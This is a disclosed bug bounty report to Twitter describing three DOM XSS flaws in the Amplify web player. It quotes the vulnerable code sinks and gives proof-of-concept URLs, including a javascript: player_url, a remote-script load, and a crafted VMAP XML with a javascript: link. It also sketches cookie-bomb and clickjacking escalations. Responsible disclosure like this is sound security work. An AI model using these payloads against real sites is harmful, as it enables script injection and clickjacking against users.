# Multiple DOMXSS on Amplify Web Player

## Report Details
- **Report ID**: 88719
- **URL**: https://hackerone.com/reports/88719
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2015-09-13T13:08:16.024Z
- **Disclosed**: 2017-04-15T08:27:59.074Z

## Reporter
- **Username**: filedescriptor
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: x

## Vulnerability Information
Hi,
I would like to report multiple DOMXSS issues on https://amp.twimg.com/amplify-web-player/prod/source.html.

##Details:

> Please use latest IE to open all the PoCs because of CSP

##1. ```$.get``` sink

```javascript
define("data/playlist/with_json_loader", ["require", "flight/lib/compose", "data/playlist/with_json_parser"], function(e) {
    function r() {
        t.mixin(this, [n]),
        this.loadJson = function(e) {
            return $.get(e).then(this.parseJson.bind(this))
-----------------------^^
```

It is dangerous to use jQuery's ajax function without specifying the expected data type. Attacker can supply a remote js file to achieve XSS. This can be addressed by specifying the data type to be JSON. [Ref](https://github.com/jquery/jquery/issues/2432).

**PoC**: https://amp.twimg.com/amplify-web-player/prod/source.html?url=https://innerht.ml/vectors/js.php
After clicking the play button, an alert will be popped up.

##2. Lack of URL validation on ```playerUrl```

```javascript
define("ui/playback/vine_display", ["require", "flight/lib/component"], function(e) {
    function n() {
        this.attributes({
            playerUrl: undefined
        }),
        this.$frame = undefined,
        this.loadVideo = function() {
            if (!this.attr.playerUrl)
                return;
            this.$frame = $('<iframe id="vine-frame" frameborder="0" scrolling="no" allowtransparency="true"></iframe>'),
            this.$frame.attr("src", this.attr.playerUrl),
-----------------------------------------------^^
```

When the source type is Vine, the player will try to inject an iframe with user-supplied parameter ```player_url```. Attacker can make it a ```javascript:``` attacker vector. Proper fix would be to validate if the URL starts with http(s). 

**PoC**: https://amp.twimg.com/amplify-web-player/prod/source.html?player_url=javascript:alert(1)&source_type=vine
After clicking the play button, an alert will be popped up.

##3. Lack of URL validation on ```ctaLink```

```javascript
        this.updateCallToAction = function(e, t) {
            var i = this.select("textNodeSelector");
            i.html("");
            if (t && t.url && t.type) {
                this.id = t.id,
                this.type = t.type,
                this.ctaLink = t.url;
                var s, o = n.getUrlMetadata(this.ctaLink), u = o.hostname;
                u.indexOf("www.") === 0 && (u = u.substr(4)),
                t.type === "visit" ? s = r("Visit %{hostname}", {
                    hostname: u
                }) : s = r("Watch now at %{hostname}", {
                    hostname: u
                });
                var a = $("<a target='_blank'></a>");
                a.attr("href", this.ctaLink),
--------------------------------------^^
```

When loading a vmap file, the player will inject an anchor referencing ```tw:cta_open_url```. Attacker can supply a remote vmap file with crafted ```tw:cta_open_url``` value (e.g. ```javascript:```) to perform XSS. Such file would be like this:

```xml
<?xml version="1.0" encoding="UTF-8"?>

<vmap:VMAP xmlns:tw="http://twitter.com/schema/videoVMapV2.xsd"
           xmlns:vmap="http://www.iab.net/vmap-1.0"
           xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
           xmlns:esi="http://www.edge-delivery.org/esi/1.0"
           xsi:noNamespaceSchemaLocation="vast3.xsd">
  <vmap:Extensions>
    <vmap:Extension>
      <tw:amplify>
        <tw:content ownerId="915643998" contentId="fce6b1eb-b250-437f-9e68-2e9e5813a6d7" stitched="false">

      <tw:cta_open_url url="javascript:alert(1)" />

          <MediaFiles>
            <MediaFile>
              <![CDATA[http://amp.twimg.com/prod/multibr_v_1/video/2015/03/26/16/0f41c544-uploadedvideo-libx264-main-2028k.mp4?9gOtbn78IXQ3XYKMMntL6URZZjLVfwxgCGtkHlrJ1CY%3D]]>
            </MediaFile>
          </MediaFiles>
        </tw:content>
      </tw:amplify>
    </vmap:Extension>
  </vmap:Extensions>
</vmap:VMAP>
```
I don't have PoC for this one because the vmap file needs to be hosted on a white-listed domain, but it is still a potential attack.

#Impact
Now, one may wonder how these XSSes can affect users. There are at least two ways I can think of:

#1. Denial of Service
The domain ```*.twimg.com``` is used to store various static files all over Twitter. Attacker can use Cookie Bomb attack to effectively make users unable to access them, hence breaking a lot of things when users browser Twitter.

#2. Clickjacking
Amplify Web Players usually appear in user's timeline. As they are embedded in iframe, attacker can use XSS to change the player's URL. Combining the flaw of ```X-Frame-Options: SAMEORIGIN```, attacker can conduct a clickjacking attack with some user interactions. This is a bit tricky to explain so I guess you can watch the video demo to get some ideas.

**PoC**: http://innerht.ml/pocs/twitter-amp-xss/
After clicking the button, a new window will be opened. Wait a few seconds and click the amplify player. After that the opener page will be changed to a Tweet and the original amplify player will become an attacker controlled page which contains clickjacking attack.

**Video Demo**: https://vimeo.com/139118917 (password: xfo)



## Attachments
No attachments
